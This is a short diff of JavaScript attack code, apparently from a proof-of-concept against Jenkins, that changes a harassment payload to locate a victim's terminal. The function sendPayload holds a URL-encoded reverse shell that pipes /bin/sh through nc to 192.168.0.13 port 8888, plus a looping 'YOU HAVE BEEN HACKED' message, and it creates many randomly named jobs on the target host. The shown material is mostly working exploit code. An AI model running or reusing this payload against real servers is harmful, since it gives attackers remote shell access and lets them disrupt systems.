@@ -55,7 +55,7 @@ So if you want to host script on some phishy domain, it will work only on jenkin
         }
         function sendPayload(name, payload, host){
           var shell = "mknod+%2Ftmp%2Fbackpipe+p+%26%26+%2Fbin%2Fsh+0%3C%2Ftmp%2Fbackpipe+%7C+nc+192.168.0.13+8888+1%3E%2Ftmp%2Fbackpipe"
-          var Payload = "while%20%3A%3B%20do%20sleep%201%3Becho%20%27YOU%20HAVE%20BEEN%20HACKED!!!!%27%20%7C%20write%20pentest%20pts%2F0%3B%20done";
+          var Payload = "while%20%3A%3B%20do%20sleep%201%3Bterm%3D%24(who%20%7C%20grep%20pts%20%7C%20awk%20%27%7Bprint%20%242%7D%27)%3Becho%20%27YOU%20HAVE%20BEEN%20HACKED!!!!%27%20%7C%20write%20pentest%20%24term%3B%20done";
           for(i=0; i< 10; i++){
             name2 = name + Math.floor((Math.random() * 1000) + 1);
             createJob(name2, host);
